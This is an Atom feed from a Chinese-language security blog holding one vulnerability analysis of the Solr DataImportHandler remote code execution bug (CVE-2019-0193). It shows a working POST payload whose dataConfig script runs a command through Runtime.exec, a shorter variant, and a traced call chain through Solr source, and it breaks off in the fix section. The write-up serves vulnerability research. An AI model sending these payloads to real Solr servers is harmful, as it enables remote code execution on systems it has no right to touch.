<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anemone&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://anemone.top/"/>
  <updated>2019-11-03T12:39:41.011Z</updated>
  <id>http://anemone.top/</id>
  
  <author>
    <name>Anemone</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析</title>
    <link href="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/"/>
    <id>http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/</id>
    <published>2019-11-03T12:30:49.000Z</published>
    <updated>2019-11-03T12:39:41.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>先到solr上下载jar和src，这里选择的版本为v8.1.0</p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip</a></p><p>运行远程调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span>.0</span><br><span class="line">$ cd server/ #一定要再server下运行</span><br><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span>.0/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --<span class="keyword">module</span>=http</span><br></pre></td></tr></table></figure><a id="more"></a><p>访问 <a href="http://localhost:8983/solr/" target="_blank" rel="noopener">http://localhost:8983/solr/</a> 出现控制台说明服务启动成功</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>发送payload(注意tika是demo中存在的core，需要针对其他站点做变动)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 363</span><br><span class="line"></span><br><span class="line">command=full-import&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">  function func(x)&#123;</span><br><span class="line">  <span class="attribute">java.lang.Runtime.getRuntime().exec("calc");</span></span><br><span class="line">  &#125; </span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:func" /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><p>能弹计算器说明payload生效。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="dataimport"><a href="#dataimport" class="headerlink" title="dataimport"></a>dataimport</h3><p>先了解下<code>/solr/{core}/dataimport</code>，该API的作用是将数据全量/增量导入到solr中，更详细解释在：</p><ul><li><a href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer</a> </li><li><a href="https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html" target="_blank" rel="noopener">https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a> </li></ul><p>其中看到payload中需要的字段有：</p><ul><li>dataSource：数据源，有以下几种类型，每种类型有自己不同的属性<ul><li>JdbcDataSource：数据库源</li><li>URLDataSource：通常与XPathEntityProcessor配合使用，可以使用file://、http://、                          ftp://等协议获取文本数据源</li><li>HttpDataSource：与URLDataSource一样，只是名字不同</li><li>FileDataSource：从磁盘文件获取数据源</li><li>FieldReaderDataSource：如果字段包含xml信息时，可以使用这个配合XPathEntityProcessor                                使用</li><li>ContentStreamDataSource：使用post数据作为数据源，可与任何EntityProcessor配合使用</li></ul></li><li>Entity：实体，相当于将数据源的操作的数据封装成一个Java对象，字段就对应对象属性，对于xml/http数据源的实体可以在默认属性之上具有以下属性：<ul><li>url（必须）：用于调用REST API的URL。（可以模板化）。如果数据源是文件，则它必须是文件位置</li><li>processor（必须）：值必须是 “XPathEntityProcessor”</li><li>forEach（必须）：划分记录的xpath表达式。如果有多种类型的记录用“|”（管道）分隔它们。如果                         useSolrAddSchema设置为’true’，则可以省略</li><li>stream （可选）：如果xml非常大，则将此值设置为true</li></ul></li></ul><h3 id="ScriptTransformer"><a href="#ScriptTransformer" class="headerlink" title="ScriptTransformer"></a>ScriptTransformer</h3><p>从datasource变为entity存在转换(Transform)，而dataconfig中可以使用javascript写转化逻辑，例如官网中给的例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">                <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">row</span>)        </span>&#123;</span></span><br><span class="line"><span class="javascript">                    row.put(<span class="string">'message'</span>, <span class="string">'Hello World!'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> row;</span></span><br><span class="line">                &#125;</span><br><span class="line">        ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">"e"</span> <span class="attr">pk</span>=<span class="string">"id"</span> <span class="attr">transformer</span>=<span class="string">"script:f1"</span> <span class="attr">query</span>=<span class="string">"select * from X"</span>&gt;</span></span><br><span class="line">                ....</span><br><span class="line">                <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这也是造成本次rce的sink点了。</p><h3 id="Nashorn-解析"><a href="#Nashorn-解析" class="headerlink" title="Nashorn 解析"></a>Nashorn 解析</h3><p>在<code>&lt;script&gt;</code>标签中，定义了js脚本，其背后是通过Nashorn做解析的，具体来说，其可以使用js语法，引用java中的对象，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">`my.package.MyJavaClass`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">'Nashorn'</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure><h2 id="静态分析入口点"><a href="#静态分析入口点" class="headerlink" title="静态分析入口点"></a>静态分析入口点</h2><p>先拖下对应版本的源代码（<a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz）" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz）</a></p><p>找<code>/solr/{core}/dataimport</code>的入口，在<code>server/solr-webapp/webapp/WEB-INF/web.xml</code>看filter：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Any path (name) registered in solrconfig.xml will be sent to that filter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.solr.servlet.SolrDispatchFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Exclude patterns is a list of directories that would be short circuited by the </span></span><br><span class="line"><span class="comment">  SolrDispatchFilter. It includes all Admin UI related static content.</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span> It is NOT a pattern but only matches the start of the HTTP ServletPath.</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludePatterns<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/partials/.+,/libs/.+,/css/.+,/js/.+,/img/.+,/templates/.+<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所有的url通过<code>org.apache.solr.servlet.SolrDispatchFilter</code>处理，在这个类里面调试<code>doFilter()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest _request, ServletResponse _response, FilterChain chain, <span class="keyword">boolean</span> retry)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(_request <span class="keyword">instanceof</span> HttpServletRequest)) <span class="keyword">return</span>;</span><br><span class="line">  HttpServletRequest request = closeShield((HttpServletRequest)_request, retry);</span><br><span class="line">  HttpServletResponse response = closeShield((HttpServletResponse)_response, retry);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cores == <span class="keyword">null</span> || cores.isShutDown()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    <span class="comment">// No need to even create the HttpSolrCall object if this path is excluded.</span></span><br><span class="line">    <span class="keyword">if</span> (excludePatterns != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    AtomicReference&lt;HttpServletRequest&gt; wrappedRequest = <span class="keyword">new</span> AtomicReference&lt;&gt;();</span><br><span class="line">    <span class="comment">// the response and status code have already been sent</span></span><br><span class="line">    <span class="keyword">if</span> (!authenticateRequest(request, response, wrappedRequest)) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (wrappedRequest.get() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Authentication</span></span><br><span class="line">    <span class="keyword">if</span> (cores.getAuthenticationPlugin() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Entry</span></span><br><span class="line">    HttpSolrCall call = getHttpSolrCall(request, response, retry);</span><br><span class="line">    ExecutorUtil.setServerThreadFlag(Boolean.TRUE);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Action result = call.call();</span><br><span class="line">      <span class="keyword">switch</span> (result) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码在17-20行，首先根据request找到<code>HttpSolrCall</code>对象，再调用<code>HttpSolrCal#call()</code>方法获取返回值。</p><p>那么跟到<code>org.apache.solr.servlet.HttpSolrCall#call()</code>看下…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();</span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">    <span class="keyword">if</span> (shouldAudit(EventType.ERROR)) &#123;</span><br><span class="line">      cores.getAuditLoggerPlugin().doAudit(<span class="keyword">new</span> AuditEvent(EventType.ERROR, ex, req));</span><br><span class="line">    &#125;</span><br><span class="line">    sendError(ex);</span><br><span class="line">    <span class="comment">// walk the the entire cause chain to search for an Error</span></span><br><span class="line">    Throwable t = ex;</span><br><span class="line">    <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (t <span class="keyword">instanceof</span> Error) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="找入口点"><a href="#找入口点" class="headerlink" title="找入口点"></a>找入口点</h3><p>实在看不下去了，根本不知道走哪个case，还是动态调试吧，之前已经用jwdp起了项目，现在用IDEA将src文件夹建个项目，然后加<code>dist</code>和<code>server/lib</code>目录到library里，用RemoteDebug下断点调试就行了。</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png" alt="image-20191103160037181"></p><p>访问那个api后，调试发现走的是<code>PROCESS</code>的case：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png" alt="image-20191103161357607"></p><p>继续向下看到图中542行：<code>org.apache.solr.servlet.HttpSolrCall#execute()</code>，跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(SolrQueryResponse rsp)</span> </span>&#123;</span><br><span class="line">  solrReq.getContext().put(<span class="string">"webapp"</span>, req.getContextPath());</span><br><span class="line">  solrReq.getCore().execute(handler, solrReq, rsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取到SolrCore，执行其<code>org.apache.solr.core.SolrCore#execute()</code>方法，该方法会调用<code>handler.handleRequest(req,rsp)</code>对req做处理：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103162039712.png" alt="image-20191103162039712"></p><p>在<code>handler.handleRequest(req,rsp)</code>中会调用<code>org.apache.solr.handler.RequestHandlerBase#handleRequestBody()</code>方法，如果是之前能静态分析到这里，可以像Chamd5的大佬一样，搜索该类的实现，发现<code>dataimport.DataImportHandler#handleRequestBody()</code>这个方法，但是现在既然已经动态调试了，那直接跟进去就行了。</p><p>至此，我们终于找到了处理该请求的入口。</p><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequestBody</span><span class="params">(SolrQueryRequest req, SolrQueryResponse rsp)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    rsp.setHttpCaching(<span class="keyword">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> figure out why just the first one is OK...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    SolrParams params = req.getParams();</span><br><span class="line">    NamedList defaultParams = (NamedList) initArgs.get(<span class="string">"defaults"</span>);</span><br><span class="line">    RequestInfo requestParams = <span class="keyword">new</span> RequestInfo(req, getParamsMap(params), contentStream);</span><br><span class="line">    String command = requestParams.getCommand();    </span><br><span class="line">    <span class="keyword">if</span> (DataImporter.SHOW_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command != <span class="keyword">null</span> &amp;&amp; DataImporter.ABORT_CMD.equals(command)) &#123;</span><br><span class="line">      importer.runCmd(requestParams, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (importer.isBusy()) &#123;<span class="comment">/*...*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// RCE</span></span><br><span class="line">      <span class="keyword">if</span> (DataImporter.FULL_IMPORT_CMD.equals(command)</span><br><span class="line">              || DataImporter.DELTA_IMPORT_CMD.equals(command) ||</span><br><span class="line">              IMPORT_CMD.equals(command)) &#123;</span><br><span class="line">        importer.maybeReloadConfiguration(requestParams, defaultParams);</span><br><span class="line">        <span class="comment">// 获取一个SolrWriter</span></span><br><span class="line">        DIHWriter sw = getSolrWriter(processor, loader, requestParams, req);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (requestParams.isDebug()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (debugEnabled) &#123;</span><br><span class="line">            <span class="comment">// Synchronous request for the debug mode</span></span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// Asynchronous request for normal mode</span></span><br><span class="line">          <span class="keyword">if</span>(requestParams.getContentStream() == <span class="keyword">null</span> &amp;&amp; !requestParams.isSyncMode())&#123;</span><br><span class="line">            importer.runAsync(requestParams, sw);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DataImporter.RELOAD_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rsp.add(<span class="string">"status"</span>, importer.isBusy() ? <span class="string">"busy"</span> : <span class="string">"idle"</span>);</span><br><span class="line">    rsp.add(<span class="string">"importResponse"</span>, message);</span><br><span class="line">    rsp.add(<span class="string">"statusMessages"</span>, importer.getStatusMessages());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会提取出request的参数，然后关键在第18-39行，如果是调试模式(requestParams.isDebug())，则同步执行importer，如果不是则异步执行，为了方便调试，可以把payload加一个<code>debug=true</code>参数，调试同步的分支：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103165424861.png" alt="image-20191103165424861"></p><p>继续向下跟，<code>DataImporter#runCmd()</code>调用<code>DataImporter#doFullImport()</code>——因为我们参数是<code>command=full-import</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFullImport</span><span class="params">(DIHWriter writer, RequestInfo requestParams)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Starting Full Import"</span>);</span><br><span class="line">    setStatus(Status.RUNNING_FULL_DUMP);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DIHProperties dihPropWriter = createPropertyWriter();</span><br><span class="line">      setIndexStartTime(dihPropWriter.getCurrentTimestamp());</span><br><span class="line">      docBuilder = <span class="keyword">new</span> DocBuilder(<span class="keyword">this</span>, writer, dihPropWriter, requestParams);</span><br><span class="line">      checkWritablePersistFile(writer, dihPropWriter);</span><br><span class="line">      docBuilder.execute();</span><br><span class="line">      <span class="keyword">if</span> (!requestParams.isDebug())</span><br><span class="line">        cumulativeStatistics.add(docBuilder.importStatistics);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里大概就可以猜到问题在第9行——<code>docBuilder.execute()</code>了，导入的dataConfig时我们可以控制的，而config中可以自写js脚本，又想到Nashorn解析的js脚本能执行java命令，这就导致了本次的漏洞。</p><p>跟完后续的调用栈吧，sink点在<code>ScriptTransformer#initEngine()</code>的87行——<code>ScriptEngine#eval(String)</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.handler.dataimport.DocBuilder#doFullDump</span><br><span class="line">  DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl)</span><br><span class="line">    DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl, List&lt;EntityProcessorWrapper&gt;):L476</span><br><span class="line">      EntityProcessorWrapper#nextRow:L280</span><br><span class="line">        EntityProcessorWrapper#loadTransformers // 主力里面的第100-111行，如果发现script标签，则向transformers加入解析js的transformer</span><br><span class="line">        EntityProcessorWrapper#applyTransformer:L222</span><br><span class="line">          ScriptTransformer#transformRow:L52</span><br><span class="line">           ScriptTransformer#initEngine:L87</span><br><span class="line">             ScriptEngine#eval(String) //这里的string就是之前script里的内容</span><br><span class="line">           javax.script.Invocable#invokeFunction//这里调用之前func定义的内容，产生RCE</span><br></pre></td></tr></table></figure><p>值得注意的是，我们可以直接在<code>ScriptEngine#eval(String)</code>处就直接RCE，即将script直接换成如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">&lt;![CDATA[java.lang.Runtime.getRuntime().exec("calc");]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是这样程序日志会有报错，因为invokeFunction找不到，综上本文还是选择了定义函数的payload。</p><h1 id="影响范围和修复"><a href="#影响范围和修复" class="headerlink" title="影响范围和修复"></a>影响范围和修复</h1><p>此漏洞影响solr&lt;=8.1.1，对比8.2.0可以看到修复方案：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202031725.png" 